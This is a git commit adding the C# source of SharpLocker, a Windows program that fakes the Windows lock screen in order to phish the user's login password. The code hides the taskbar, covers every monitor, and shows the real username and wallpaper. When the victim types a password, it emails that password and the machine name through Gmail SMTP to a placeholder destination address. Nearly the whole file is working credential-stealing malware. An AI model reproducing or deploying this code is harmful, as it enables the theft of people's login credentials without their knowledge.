73e28f3ae741bbde5e19bd63cfa3c89a3f055c87
ducseul <33241024+ducseul@users.noreply.github.com>
2020-04-19 12:54:33 +0700

    Add files via upload

---
+++ SharpLocker/LockScreenForm.cs
@@ -0,0 +1,239 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Net.Mail;
+using System.Net;
+
+namespace SharpLocker
+{
+    public partial class LockScreenForm : Form
+    {
+        public class ahihi
+        {
+
+        }
+        public LockScreenForm()
+        {
+            InitializeComponent();
+            Taskbar.Hide();
+            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            WindowState = FormWindowState.Normal;
+            StartPosition = FormStartPosition.Manual;
+            Location = new Point(0, 0);
+            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Image myimage = new Bitmap(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
+            BackgroundImage = myimage;
+            BackgroundImageLayout = ImageLayout.Stretch;
+            this.TopMost = true;
+            string userName = System.Environment.UserName.ToString();
+            UserNameLabel.Text = userName;
+            UserNameLabel.BackColor = System.Drawing.Color.Transparent;
+            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
+            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
+            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
+            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
+            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
+            int bottomname = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 95;
+            PasswordTextBox.Top = usernameloch;
+            ProfileIcon.Top = usericonh;
+            SubmitPasswordButton.Top = buttonh;
+            UserNameLabel.Top = usernameh;
+            LockedLabel.Top = locked;
+            PasswordTextBox.UseSystemPasswordChar = true;
+
+
+            foreach (var screen in Screen.AllScreens)
+            {
+
+                Thread thread = new Thread(() => WorkThreadFunction(screen));
+                thread.Start();
+            }
+
+
+        }
+
+        public class Taskbar
+        {
+            [DllImport("user32.dll")]
+            private static extern int FindWindow(string className, string windowText);
+
+            [DllImport("user32.dll")]
+            private static extern int ShowWindow(int hwnd, int command);
+
+            [DllImport("user32.dll")]
+            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);
+
+            [DllImport("user32.dll")]
+            private static extern int GetDesktopWindow();
+
+            private const int SW_HIDE = 0;
+            private const int SW_SHOW = 1;
+
+            protected static int Handle
+            {
+                get
+                {
+                    return FindWindow("Shell_TrayWnd", "");
+                }
+            }
+
+            protected static int HandleOfStartButton
+            {
+                get
+                {
+                    int handleOfDesktop = GetDesktopWindow();
+                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
+                    return handleOfStartButton;
+                }
+            }
+
+            private Taskbar()
+            {
+                // hide ctor
+            }
+
+            public static void Show()
+            {
+                ShowWindow(Handle, SW_SHOW);
+                ShowWindow(HandleOfStartButton, SW_SHOW);
+            }
+
+            public static void Hide()
+            {
+                ShowWindow(Handle, SW_HIDE);
+                ShowWindow(HandleOfStartButton, SW_HIDE);
+            }
+        }
+
+        public void WorkThreadFunction(Screen screen)
+        {
+            try
+            {
+                if (screen.Primary == true)
+                {
+                   
+                    
+                }
+
+                if (screen.Primary == false)
+                {
+                    int mostLeft = screen.WorkingArea.Left;
+                    int mostTop = screen.WorkingArea.Top;
+                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
+                    using (Form form = new Form())
+                    {
+                        form.WindowState = FormWindowState.Normal;
+                        form.StartPosition = FormStartPosition.Manual;
+                        form.Location = new Point(mostLeft, mostTop);
+                        form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
+                        form.BackColor = Color.Black;
+                        form.ShowDialog();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // log errors
+            }
+        }
+
+
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+
+        private void UserNameLabel_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                var parms = base.CreateParams;
+                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
+                parms.ExStyle |= 0x02000000;
+                return parms;
+            }
+        }
+
+        private void pictureBox2_Click(object sender, EventArgs e)
+        {
+            Taskbar.Show();
+            System.Windows.Forms.Application.Exit();
+        }
+
+        protected override void OnClosing(CancelEventArgs e)
+        {
+                Taskbar.Show();
+            base.OnClosing(e);
+        }
+
+        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
+        {
+            Console.WriteLine(PasswordTextBox);
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void pictureBox3_Click(object sender, EventArgs e)
+        {
+            Taskbar.Show();
+            System.Windows.Forms.Application.Exit();
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            string text = "Report from: " + Environment.MachineName + "\nPassword: " + PasswordTextBox.Text;
+            Taskbar.Show();
+            System.Windows.Forms.Application.Exit();
+            reportMaster(text);
+        }
+
+        private void reportMaster(string text)
+        {
+            var fromAddress = new MailAddress("*your-gmail", "automatic report");
+            var toAddress = new MailAddress("*destination-to-get-gmail", "*report-name");
+            const string fromPassword = "*your-gmail-password";
+            string subject = "*subject-name";
+            string body = text;
+
+            var smtp = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                Credentials = new NetworkCredential(fromAddress.Address, fromPassword),
+                Timeout = 20000
+            };
+            using (var message = new MailMessage(fromAddress, toAddress)
+            {
+                Subject = subject,
+                Body = body
+            })
+            {
+                smtp.Send(message);
+            }
+        }
+    }
+    
+
+}
